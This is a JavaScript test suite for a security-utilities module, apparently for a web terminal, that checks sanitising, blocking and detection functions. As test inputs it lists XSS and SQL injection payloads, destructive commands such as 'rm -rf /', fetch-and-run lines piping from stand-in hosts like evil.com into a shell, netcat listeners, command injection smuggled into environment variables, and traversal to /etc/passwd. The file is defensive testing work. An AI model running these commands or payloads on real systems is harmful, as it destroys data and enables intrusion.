/**
 * Security Utilities Test Suite
 * Tests input sanitization, XSS prevention, and security validation
 */

const {
  sanitizeInput,
  validateCommand,
  escapeHTML,
  sanitizeFilePath,
  validateWebSocketMessage,
  detectMaliciousPatterns,
  rateLimit,
  validateSessionToken,
  sanitizeTerminalOutput,
  validateEnvironmentVariables
} = require('../security-utils');

describe('Security Utils', () => {
  describe('sanitizeInput', () => {
    it('should remove script tags', () => {
      const malicious = '<script>alert("xss")</script>Hello';
      const sanitized = sanitizeInput(malicious);
      
      expect(sanitized).toBe('Hello');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should escape HTML entities', () => {
      const input = '<div>Test & "quotes" \'single\'</div>';
      const sanitized = sanitizeInput(input);
      
      expect(sanitized).toBe('&lt;div&gt;Test &amp; &quot;quotes&quot; &#x27;single&#x27;&lt;/div&gt;');
    });

    it('should handle nested script attempts', () => {
      const input = '<scr<script>ipt>alert("nested")</scr</script>ipt>';
      const sanitized = sanitizeInput(input);
      
      expect(sanitized).not.toContain('script');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove event handlers', () => {
      const input = '<div onclick="malicious()" onmouseover="evil()">Content</div>';
      const sanitized = sanitizeInput(input);
      
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('malicious()');
    });

    it('should handle javascript: protocols', () => {
      const input = '<a href="javascript:alert(\\"xss\\")">Link</a>';
      const sanitized = sanitizeInput(input);
      
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    it('should preserve safe content', () => {
      const safeInput = 'Hello World! This is safe text with numbers 123.';
      const sanitized = sanitizeInput(safeInput);
      
      expect(sanitized).toBe(safeInput);
    });

    it('should handle empty and null inputs', () => {
      expect(sanitizeInput('')).toBe('');
      expect(sanitizeInput(null)).toBe('');
      expect(sanitizeInput(undefined)).toBe('');
    });

    it('should handle unicode and special characters', () => {
      const input = '🚀 Unicode test with émojis and ñ characters';
      const sanitized = sanitizeInput(input);
      
      expect(sanitized).toBe(input); // Should preserve unicode
    });
  });

  describe('validateCommand', () => {
    it('should allow safe commands', () => {
      const safeCommands = [
        'ls -la',
        'cd /home/user',
        'npm install',
        'node server.js',
        'git status'
      ];

      safeCommands.forEach(cmd => {
        expect(validateCommand(cmd)).toBe(true);
      });
    });

    it('should block dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf *',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1',
        'format c:',
        'del /f /q /s *.*'
      ];

      dangerousCommands.forEach(cmd => {
        expect(validateCommand(cmd)).toBe(false);
      });
    });

    it('should block privilege escalation attempts', () => {
      const escalationCommands = [
        'sudo su',
        'su root',
        'chmod 777 /',
        'chown root:root file',
        'passwd root'
      ];

      escalationCommands.forEach(cmd => {
        expect(validateCommand(cmd)).toBe(false);
      });
    });

    it('should block network security risks', () => {
      const networkCommands = [
        'nc -l -p 1234',
        'netcat -l 8080',
        'wget http://malicious.com/script.sh | bash',
        'curl evil.com/payload | sh'
      ];

      networkCommands.forEach(cmd => {
        expect(validateCommand(cmd)).toBe(false);
      });
    });

    it('should handle command injection attempts', () => {
      const injectionCommands = [
        'ls; rm -rf /',
        'echo "test" && rm file',
        'cat file || rm *',
        'ls | xargs rm',
        'ls `rm file`'
      ];

      injectionCommands.forEach(cmd => {
        expect(validateCommand(cmd)).toBe(false);
      });
    });

    it('should validate command length limits', () => {
      const longCommand = 'ls ' + 'a'.repeat(10000);
      expect(validateCommand(longCommand)).toBe(false);
    });
  });

  describe('escapeHTML', () => {
    it('should escape basic HTML entities', () => {
      const input = '<div>Test & "quotes"</div>';
      const escaped = escapeHTML(input);
      
      expect(escaped).toBe('&lt;div&gt;Test &amp; &quot;quotes&quot;&lt;/div&gt;');
    });

    it('should escape single quotes', () => {
      const input = "It's a test";
      const escaped = escapeHTML(input);
      
      expect(escaped).toBe('It&#x27;s a test');
    });

    it('should handle multiple entities', () => {
      const input = '<>&"\'';
      const escaped = escapeHTML(input);
      
      expect(escaped).toBe('&lt;&gt;&amp;&quot;&#x27;');
    });
  });

  describe('sanitizeFilePath', () => {
    it('should remove directory traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '/etc/passwd',
        'C:\\Windows\\System32',
        '~/../../../../etc/passwd'
      ];

      maliciousPaths.forEach(path => {
        const sanitized = sanitizeFilePath(path);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toMatch(/^[\/\\]/);
        expect(sanitized).not.toContain('etc/passwd');
        expect(sanitized).not.toContain('system32');
      });
    });

    it('should allow safe relative paths', () => {
      const safePaths = [
        'documents/file.txt',
        'projects/myapp/src/index.js',
        'images/photo.jpg'
      ];

      safePaths.forEach(path => {
        const sanitized = sanitizeFilePath(path);
        expect(sanitized.length).toBeGreaterThan(0);
        expect(sanitized).not.toContain('..');
      });
    });

    it('should handle null and empty paths', () => {
      expect(sanitizeFilePath(null)).toBe('');
      expect(sanitizeFilePath('')).toBe('');
      expect(sanitizeFilePath(undefined)).toBe('');
    });

    it('should normalize path separators', () => {
      const path = 'documents\\\\file..txt';
      const sanitized = sanitizeFilePath(path);
      
      expect(sanitized).toBe('documents/file.txt');
    });
  });

  describe('validateWebSocketMessage', () => {
    it('should validate message structure', () => {
      const validMessage = {
        type: 'terminal_input',
        payload: { data: 'ls -la' },
        timestamp: Date.now()
      };

      expect(validateWebSocketMessage(validMessage)).toBe(true);
    });

    it('should reject malformed messages', () => {
      const invalidMessages = [
        null,
        undefined,
        'string message',
        { type: 'missing_payload' },
        { payload: 'missing_type' },
        { type: '', payload: {} }
      ];

      invalidMessages.forEach(msg => {
        expect(validateWebSocketMessage(msg)).toBe(false);
      });
    });

    it('should validate message types', () => {
      const validTypes = [
        'terminal_input',
        'terminal_resize',
        'session_create',
        'session_destroy'
      ];

      validTypes.forEach(type => {
        const message = { type, payload: {}, timestamp: Date.now() };
        expect(validateWebSocketMessage(message)).toBe(true);
      });
    });

    it('should reject unknown message types', () => {
      const invalidTypes = [
        'malicious_type',
        'admin_command',
        'system_override',
        'privilege_escalation'
      ];

      invalidTypes.forEach(type => {
        const message = { type, payload: {}, timestamp: Date.now() };
        expect(validateWebSocketMessage(message)).toBe(false);
      });
    });

    it('should validate payload size limits', () => {
      const largePayload = { data: 'x'.repeat(100000) };
      const message = {
        type: 'terminal_input',
        payload: largePayload,
        timestamp: Date.now()
      };

      expect(validateWebSocketMessage(message)).toBe(false);
    });

    it('should validate timestamp freshness', () => {
      const oldMessage = {
        type: 'terminal_input',
        payload: { data: 'test' },
        timestamp: Date.now() - 3600000 // 1 hour ago
      };

      expect(validateWebSocketMessage(oldMessage)).toBe(false);
    });
  });

  describe('detectMaliciousPatterns', () => {
    it('should detect SQL injection patterns', () => {
      const sqlPatterns = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "UNION SELECT * FROM users",
        "'; INSERT INTO users VALUES",
        "OR 1=1--"
      ];

      sqlPatterns.forEach(pattern => {
        expect(detectMaliciousPatterns(pattern)).toBe(true);
      });
    });

    it('should detect XSS patterns', () => {
      const xssPatterns = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        'onmouseover="alert(1)"',
        '<img src=x onerror=alert(1)>',
        'eval(String.fromCharCode(97,108,101,114,116,40,49,41))'
      ];

      xssPatterns.forEach(pattern => {
        expect(detectMaliciousPatterns(pattern)).toBe(true);
      });
    });

    it('should detect command injection patterns', () => {
      const cmdPatterns = [
        'ls; rm -rf /',
        '`rm file`',
        '$(rm file)',
        '| wget malicious.com/script | bash',
        '; curl evil.com | sh'
      ];

      cmdPatterns.forEach(pattern => {
        expect(detectMaliciousPatterns(pattern)).toBe(true);
      });
    });

    it('should allow safe content', () => {
      const safeContent = [
        'Hello world',
        'Regular text with numbers 123',
        'Email: user@example.com',
        'URL: https://example.com/path',
        'File path: /home/user/documents/file.txt'
      ];

      safeContent.forEach(content => {
        expect(detectMaliciousPatterns(content)).toBe(false);
      });
    });
  });

  describe('rateLimit', () => {
    beforeEach(() => {
      // Clear rate limit storage
      rateLimit.clear();
    });

    it('should allow requests within limit', () => {
      const clientId = 'test-client';
      
      for (let i = 0; i < 10; i++) {
        expect(rateLimit.check(clientId, 10, 1000)).toBe(true);
      }
    });

    it('should block requests exceeding limit', () => {
      const clientId = 'test-client';
      
      // Fill up the limit
      for (let i = 0; i < 10; i++) {
        rateLimit.check(clientId, 10, 1000);
      }
      
      // Next request should be blocked
      expect(rateLimit.check(clientId, 10, 1000)).toBe(false);
    });

    it('should reset limit after time window', (done) => {
      const clientId = 'test-client';
      
      // Fill up the limit
      for (let i = 0; i < 5; i++) {
        rateLimit.check(clientId, 5, 100);
      }
      
      expect(rateLimit.check(clientId, 5, 100)).toBe(false);
      
      // Wait for reset
      setTimeout(() => {
        expect(rateLimit.check(clientId, 5, 100)).toBe(true);
        done();
      }, 150);
    });

    it('should handle multiple clients independently', () => {
      const client1 = 'client-1';
      const client2 = 'client-2';
      
      // Fill up limit for client1
      for (let i = 0; i < 5; i++) {
        rateLimit.check(client1, 5, 1000);
      }
      
      // client1 should be blocked
      expect(rateLimit.check(client1, 5, 1000)).toBe(false);
      
      // client2 should still be allowed
      expect(rateLimit.check(client2, 5, 1000)).toBe(true);
    });
  });

  describe('validateSessionToken', () => {
    it('should validate properly formatted tokens', () => {
      const validToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
      
      expect(validateSessionToken(validToken)).toBe(true);
    });

    it('should reject malformed tokens', () => {
      const invalidTokens = [
        '',
        'invalid',
        'too.few.parts',
        'too.many.parts.here.invalid',
        'invalid-base64.invalid-base64.invalid-base64'
      ];

      invalidTokens.forEach(token => {
        expect(validateSessionToken(token)).toBe(false);
      });
    });

    it('should reject expired tokens', () => {
      // Mock an expired token
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiZXhwIjoxNTE2MjM5MDIyfQ.invalid';
      
      expect(validateSessionToken(expiredToken)).toBe(false);
    });
  });

  describe('sanitizeTerminalOutput', () => {
    it('should remove ANSI escape sequences', () => {
      const output = '\\x1b[31mRed text\\x1b[0m Normal text';
      const sanitized = sanitizeTerminalOutput(output);
      
      expect(sanitized).toBe('Red text Normal text');
      expect(sanitized).not.toContain('\\x1b');
    });

    it('should handle color codes', () => {
      const output = '\\x1b[1;32mBold Green\\x1b[0m';
      const sanitized = sanitizeTerminalOutput(output);
      
      expect(sanitized).toBe('Bold Green');
    });

    it('should remove cursor movement sequences', () => {
      const output = '\\x1b[H\\x1b[2JCleared screen';
      const sanitized = sanitizeTerminalOutput(output);
      
      expect(sanitized).toBe('Cleared screen');
    });

    it('should preserve printable characters', () => {
      const output = 'Normal text with numbers 123 and symbols !@#$%';
      const sanitized = sanitizeTerminalOutput(output);
      
      expect(sanitized).toBe(output);
    });

    it('should handle malicious terminal sequences', () => {
      const maliciousOutput = '\\x1b]0;malicious title\\x07\\x1b[6n';
      const sanitized = sanitizeTerminalOutput(maliciousOutput);
      
      expect(sanitized).not.toContain('\\x1b');
      expect(sanitized).not.toContain('malicious title');
    });

    it('should limit output length', () => {
      const longOutput = 'a'.repeat(100000);
      const sanitized = sanitizeTerminalOutput(longOutput);
      
      expect(sanitized.length).toBeLessThan(50000);
    });
  });

  describe('validateEnvironmentVariables', () => {
    it('should allow safe environment variables', () => {
      const safeEnvs = {
        NODE_ENV: 'development',
        PORT: '3000',
        HOME: '/home/user',
        PATH: '/usr/bin:/bin'
      };

      expect(validateEnvironmentVariables(safeEnvs)).toBe(true);
    });

    it('should block dangerous environment variables', () => {
      const dangerousEnvs = {
        LD_PRELOAD: '/tmp/malicious.so',
        SHELL: '/tmp/malicious_shell',
        TERM: '../../etc/passwd'
      };

      expect(validateEnvironmentVariables(dangerousEnvs)).toBe(false);
    });

    it('should validate environment variable names', () => {
      const invalidNames = {
        'invalid; rm -rf /': 'value',
        'PATH;rm -rf /': '/bin',
        'VAR`rm file`': 'value'
      };

      expect(validateEnvironmentVariables(invalidNames)).toBe(false);
    });

    it('should validate environment variable values', () => {
      const invalidValues = {
        PATH: '/bin;rm -rf /',
        HOME: '`malicious command`',
        TERM: '../../etc/passwd'
      };

      expect(validateEnvironmentVariables(invalidValues)).toBe(false);
    });

    it('should handle empty environment', () => {
      expect(validateEnvironmentVariables({})).toBe(true);
      expect(validateEnvironmentVariables(null)).toBe(false);
      expect(validateEnvironmentVariables(undefined)).toBe(false);
    });
  });

  describe('Edge Cases and Security Boundaries', () => {
    it('should handle extremely long inputs', () => {
      const longInput = 'a'.repeat(1000000);
      
      expect(() => sanitizeInput(longInput)).not.toThrow();
      expect(() => detectMaliciousPatterns(longInput)).not.toThrow();
      expect(() => validateCommand(longInput)).not.toThrow();
    });

    it('should handle unicode and international characters', () => {
      const unicodeInput = '测试 🚀 français русский العربية';
      
      expect(sanitizeInput(unicodeInput)).toContain('测试');
      expect(sanitizeInput(unicodeInput)).toContain('🚀');
      expect(detectMaliciousPatterns(unicodeInput)).toBe(false);
    });

    it('should handle nested encoding attempts', () => {
      const nestedInput = '%3Cscript%3Ealert(%22nested%22)%3C/script%3E';
      
      expect(detectMaliciousPatterns(nestedInput)).toBe(true);
    });

    it('should handle binary data gracefully', () => {
      const binaryData = Buffer.from([0x00, 0x01, 0x02, 0xff]).toString('binary');
      
      expect(() => sanitizeInput(binaryData)).not.toThrow();
      expect(sanitizeInput(binaryData)).toBeDefined();
    });

    it('should prevent ReDoS attacks', () => {
      const redosPattern = 'a'.repeat(10000) + 'X';
      const startTime = Date.now();
      
      detectMaliciousPatterns(redosPattern);
      
      const executionTime = Date.now() - startTime;
      expect(executionTime).toBeLessThan(1000); // Should complete quickly
    });
  });

  describe('Integration Security Tests', () => {
    it('should handle chained attacks', () => {
      const chainedAttack = '<script>eval(atob("YWxlcnQoJ1hTUycp"))</script>';
      
      expect(detectMaliciousPatterns(chainedAttack)).toBe(true);
      expect(sanitizeInput(chainedAttack)).not.toContain('script');
      expect(sanitizeInput(chainedAttack)).not.toContain('eval');
    });

    it('should maintain security across multiple validations', () => {
      const suspiciousInput = 'normal text; rm -rf /<script>alert(1)</script>';
      
      expect(detectMaliciousPatterns(suspiciousInput)).toBe(true);
      expect(validateCommand(suspiciousInput)).toBe(false);
      
      const sanitized = sanitizeInput(suspiciousInput);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('rm -rf');
    });

    it('should handle polyglot attacks', () => {
      const polyglot = '\\"; alert(1); rm -rf /; SELECT * FROM users; --';
      
      expect(detectMaliciousPatterns(polyglot)).toBe(true);
      expect(validateCommand(polyglot)).toBe(false);
      expect(sanitizeInput(polyglot)).not.toContain('alert');
    });
  });
});